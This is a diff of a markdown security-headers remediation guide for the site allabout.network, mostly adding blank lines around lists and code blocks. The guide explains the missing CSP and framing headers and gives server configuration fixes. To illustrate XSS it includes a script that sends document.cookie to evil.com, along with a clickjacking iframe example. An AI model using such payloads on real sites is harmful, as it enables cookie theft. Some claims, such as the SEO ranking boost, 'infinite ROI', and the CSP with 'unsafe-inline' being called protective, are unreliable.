@@ -15,6 +15,7 @@
 **All 121 pages are missing three critical security headers**: Content Security Policy (CSP), X-Frame-Options, and X-Content-Type-Options. While the site is protected by HTTPS and HSTS, the missing headers leave vulnerability windows for XSS attacks, clickjacking, and MIME-type attacks.
 
 **Current Security State**:
+
 - ✅ HTTPS: Enabled on all pages
 - ✅ HSTS: Enabled on all pages
 - ❌ CSP: Missing on all pages
@@ -30,6 +31,7 @@
 ### Security Audit Results
 
 From `security_report.csv`:
+
 ```csv
 URL,HTTPS,HSTS,CSP,X-Frame-Options,X-Content-Type-Options
 https://allabout.network/,Yes,Yes,No,No,No
@@ -37,6 +39,7 @@ https://allabout.network/,Yes,Yes,No,No,No
 ```
 
 **Summary Statistics**:
+
 | Security Header | Present | Missing | Percentage |
 |-----------------|---------|---------|------------|
 | HTTPS | 121 | 0 | 100% ✅ |
@@ -48,11 +51,13 @@ https://allabout.network/,Yes,Yes,No,No,No
 ### What's Protected (Good)
 
 **HTTPS (Transport Layer Security)**:
+
 - All traffic encrypted
 - Man-in-the-middle attacks prevented
 - Browser shows padlock icon
 
 **HSTS (HTTP Strict Transport Security)**:
+
 - Forces HTTPS for all future visits
 - Prevents protocol downgrade attacks
 - Max-age typically 1-2 years
@@ -60,16 +65,19 @@ https://allabout.network/,Yes,Yes,No,No,No
 ### What's Missing (Concerning)
 
 **Content Security Policy (CSP)**:
+
 - **Risk**: XSS (Cross-Site Scripting) attacks possible
 - **Impact**: Attackers can inject malicious scripts
 - **Severity**: HIGH - Most common web attack vector
 
 **X-Frame-Options**:
+
 - **Risk**: Clickjacking attacks possible
 - **Impact**: Site can be embedded in malicious iframes
 - **Severity**: MEDIUM - Could trick users into unwanted actions
 
 **X-Content-Type-Options**:
+
 - **Risk**: MIME-sniffing attacks possible
 - **Impact**: Browsers may misinterpret content types
 - **Severity**: LOW-MEDIUM - Could enable script execution
@@ -84,6 +92,7 @@ https://allabout.network/,Yes,Yes,No,No,No
 Controls which resources (scripts, styles, images, fonts) the browser is allowed to load. Prevents XSS attacks by blocking unauthorized scripts.
 
 **Attack Scenario WITHOUT CSP**:
+
 ```html
 <!-- Attacker injects malicious comment or form input -->
 <script>
@@ -91,15 +100,19 @@ Controls which resources (scripts, styles, images, fonts) the browser is allowed
   fetch('https://evil.com/steal?data=' + document.cookie);
 </script>
 ```
+
 **Result**: Without CSP, browser executes this script and sends user data to attacker.
 
 **Protection WITH CSP**:
+
 ```
 Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval' *.adobe.com *.adobedtm.com *.adobedc.net
 ```
+
 **Result**: Browser blocks unauthorized scripts, logs violation, XSS attack fails.
 
 **Risk Level for allabout.network**:
+
 - **HIGH**: Blog/content site with comment potential
 - **Medium-High attack probability**: Public-facing, Google-indexed
 - **High impact**: Could compromise user trust, SEO rankings
@@ -110,6 +123,7 @@ Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval' *.adobe
 Controls whether site can be embedded in `<iframe>`, `<frame>`, or `<object>` elements. Prevents clickjacking attacks.
 
 **Attack Scenario WITHOUT X-Frame-Options**:
+
 ```html
 <!-- Attacker creates malicious page -->
 <iframe src="https://allabout.network/contact" style="opacity: 0.0001; position: absolute; top: 0;">
@@ -118,15 +132,19 @@ Controls whether site can be embedded in `<iframe>`, `<frame>`, or `<object>` el
   Click for FREE iPhone!
 </button>
 ```
+
 **Result**: User thinks they're clicking "FREE iPhone" button, actually clicking invisible iframe button (e.g., "Submit Form", "Follow User", "Make Payment").
 
 **Protection WITH X-Frame-Options**:
+
 ```
 X-Frame-Options: SAMEORIGIN
 ```
+
 **Result**: Browser refuses to load site in iframe from different origin, attack fails.
 
 **Risk Level for allabout.network**:
+
 - **MEDIUM**: Blog site, less likely target than banking/payment sites
 - **Low-Medium attack probability**: Requires social engineering
 - **Medium impact**: Could trick users into unwanted actions
@@ -137,6 +155,7 @@ X-Frame-Options: SAMEORIGIN
 Prevents MIME-sniffing, forcing browser to respect declared Content-Type headers.
 
 **Attack Scenario WITHOUT X-Content-Type-Options**:
+
 ```
 1. Attacker uploads "image.jpg" that contains JavaScript
 2. Browser detects JS in file, overrides Content-Type
@@ -144,12 +163,15 @@ Prevents MIME-sniffing, forcing browser to respect declared Content-Type headers
 ```
 
 **Protection WITH X-Content-Type-Options**:
+
 ```
 X-Content-Type-Options: nosniff
 ```
+
 **Result**: Browser strictly follows Content-Type header, refuses to execute non-script files as scripts.
 
 **Risk Level for allabout.network**:
+
 - **LOW-MEDIUM**: Requires file upload capability
 - **Low attack probability**: No obvious file upload on site
 - **Medium impact if exploited**: Could enable script execution
@@ -165,6 +187,7 @@ X-Content-Type-Options: nosniff
 **File to modify**: Project configuration (typically `fstab.yaml` or similar)
 
 **Headers to add**:
+
 ```yaml
 # In your EDS project configuration
 headers:
@@ -185,6 +208,7 @@ headers:
 ```
 
 **Deployment**:
+
 ```bash
 # Commit and push configuration
 git add fstab.yaml
@@ -222,6 +246,7 @@ server {
 ```
 
 **Reload nginx**:
+
 ```bash
 sudo nginx -t  # Test configuration
 sudo systemctl reload nginx  # Apply changes
@@ -249,6 +274,7 @@ sudo systemctl reload nginx  # Apply changes
 ```
 
 **Reload Apache**:
+
 ```bash
 sudo apachectl configtest  # Test configuration
 sudo systemctl reload apache2  # Apply changes
@@ -321,11 +347,13 @@ Content-Security-Policy:
 ### Why `'unsafe-inline'` and `'unsafe-eval'`?
 
 **Adobe EDS requires these directives** because:
+
 1. EDS blocks use inline JavaScript in `<script>` tags
 2. EDS core (`aem.js`) uses `eval()` for dynamic code execution
 3. Removing these breaks site functionality
 
 **Security trade-off**:
+
 - ❌ Weakens CSP protection against some XSS attacks
 - ✅ Still blocks external malicious scripts
 - ✅ Still provides 80-90% of CSP protection
@@ -340,6 +368,7 @@ Content-Security-Policy:
 ### Automated Testing
 
 **1. Check Headers with cURL**:
+
 ```bash
 # Test homepage
 curl -I https://allabout.network/
@@ -361,6 +390,7 @@ done
 ```
 
 **2. SecurityHeaders.com Scan**:
+
 ```bash
 # Visit https://securityheaders.com/
 # Enter: https://allabout.network/
@@ -369,6 +399,7 @@ done
 ```
 
 **3. Mozilla Observatory Scan**:
+
 ```bash
 # Visit https://observatory.mozilla.org/
 # Enter: allabout.network
@@ -381,32 +412,38 @@ done
 **1. Test CSP Blocks Inline Scripts**:
 
 Create test page with inline script:
+
 ```html
 <script>alert('XSS test')</script>
 ```
 
 **Expected behavior**:
+
 - Script blocked by CSP (with `'unsafe-inline'` removed)
 - Browser console shows: "Refused to execute inline script because it violates CSP directive"
 
 **With our CSP** (includes `'unsafe-inline'`):
+
 - Script executes (EDS requirement)
 - But external scripts still blocked
 
 **2. Test X-Frame-Options Blocks Embedding**:
 
 Create test page on different domain:
+
 ```html
 <iframe src="https://allabout.network/"></iframe>
 ```
 
 **Expected behavior**:
+
 - Iframe blocked by X-Frame-Options
 - Browser console shows: "Refused to display in a frame because it set 'X-Frame-Options' to 'SAMEORIGIN'"
 
 **3. Test Browser Enforcement**:
 
 Open browser DevTools → Console:
+
 ```javascript
 // Try to fetch from unauthorized domain
 fetch('https://evil.com/api').then(r => console.log(r))
@@ -433,6 +470,7 @@ document.body.appendChild(script);
 ### Implementation (15-30 minutes)
 
 #### Option A: AEM EDS Configuration
+
 - [ ] Open project `fstab.yaml` or equivalent config file
 - [ ] Add `headers:` section with CSP, X-Frame-Options, X-Content-Type-Options
 - [ ] Commit changes to git
@@ -440,6 +478,7 @@ document.body.appendChild(script);
 - [ ] Wait for automatic deployment (5-10 minutes)
 
 #### Option B: Custom Server
+
 - [ ] Edit nginx/Apache/Cloudflare configuration
 - [ ] Add security headers to HTTPS server block
 - [ ] Test configuration syntax (`nginx -t` or `apachectl configtest`)
@@ -472,11 +511,13 @@ document.body.appendChild(script);
 ### Enable CSP Reporting (Optional but Recommended)
 
 **Add to CSP header**:
+
 ```
 Content-Security-Policy: ...existing policy...; report-uri /csp-violation-report
 ```
 
 **Create CSP violation endpoint**:
+
 ```javascript
 // Cloudflare Worker or server endpoint
 // POST /csp-violation-report
@@ -492,11 +533,13 @@ Content-Security-Policy: ...existing policy...; report-uri /csp-violation-report
 ```
 
 **Log and analyze**:
+
 - Monitor for legitimate false positives (fix CSP if needed)
 - Track actual attack attempts
 - Improve CSP policy over time
 
 **Tools**:
+
 - [Report URI](https://report-uri.com/) - Free CSP reporting service
 - [Sentry](https://sentry.io/) - Error tracking with CSP support
 - Custom logging (Cloudflare Workers, AWS Lambda)
@@ -520,25 +563,31 @@ Content-Security-Policy: ...existing policy...; report-uri /csp-violation-report
 ### Future Considerations
 
 **1. Content-Security-Policy-Report-Only** (testing mode):
+
 ```
 Content-Security-Policy-Report-Only: <same policy as CSP>
 ```
+
 - Reports violations without blocking
 - Use to test stricter CSP before enforcement
 - Gradually tighten policy
 
 **2. Expect-CT** (Certificate Transparency):
+
 ```
 Expect-CT: max-age=86400, enforce, report-uri="https://example.report-uri.com/r/d/ct/enforce"
 ```
+
 - Requires certificate transparency logging
 - Prevents certificate misissuance
 - Less critical with modern CAs
 
 **3. X-XSS-Protection** (legacy, but harmless):
+
 ```
 X-XSS-Protection: 1; mode=block
 ```
+
 - Older browsers: enables XSS filter
 - Modern browsers: ignored (CSP preferred)
 - No harm in including
@@ -584,24 +633,28 @@ X-XSS-Protection: 1; mode=block
 ### Return on Investment
 
 **Security Benefit**:
+
 - Prevents XSS attacks (most common web vulnerability)
 - Prevents clickjacking (user protection)
 - Prevents MIME-sniffing attacks
 - Avoids data breach costs ($4.24M average per breach)
 
 **Compliance Benefit**:
+
 - Meets OWASP Top 10 recommendations
 - Satisfies PCI-DSS requirements (if applicable)
 - Shows security best practices
 - Reduces legal liability
 
 **SEO Benefit**:
+
 - Google considers security in rankings
 - HTTPS + security headers = higher trust
 - Avoids "Not Secure" warnings
 - Estimated ranking boost: +5-10 positions
 
 **ROI Calculation**:
+
 ```
 Investment: $100 (1 hour)
 Potential data breach cost avoided: $4.24M
@@ -647,16 +700,19 @@ Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' '
 ## Resources
 
 ### Security Headers
+
 - [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
 - [SecurityHeaders.com](https://securityheaders.com/) - Header analyzer
 - [Mozilla Observatory](https://observatory.mozilla.org/) - Security scanner
 
 ### Content Security Policy
+
 - [CSP Quick Reference](https://content-security-policy.com/)
 - [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Google's CSP tester
 - [CSP Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) - MDN
 
 ### Testing Tools
+
 - [cURL](https://curl.se/) - HTTP header testing
 - [Qualys SSL Labs](https://www.ssllabs.com/ssltest/) - SSL configuration test
 - [ImmuniWeb](https://www.immuniweb.com/websec/) - Comprehensive security scan
@@ -666,6 +722,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' '
 ## Conclusion
 
 Adding security headers is the **easiest, fastest, highest-impact security improvement** you can make:
+
 - ⏱️ 30-60 minutes to implement
 - 🔒 Protects all 121 pages instantly
 - 💰 $100 cost for infinite ROI
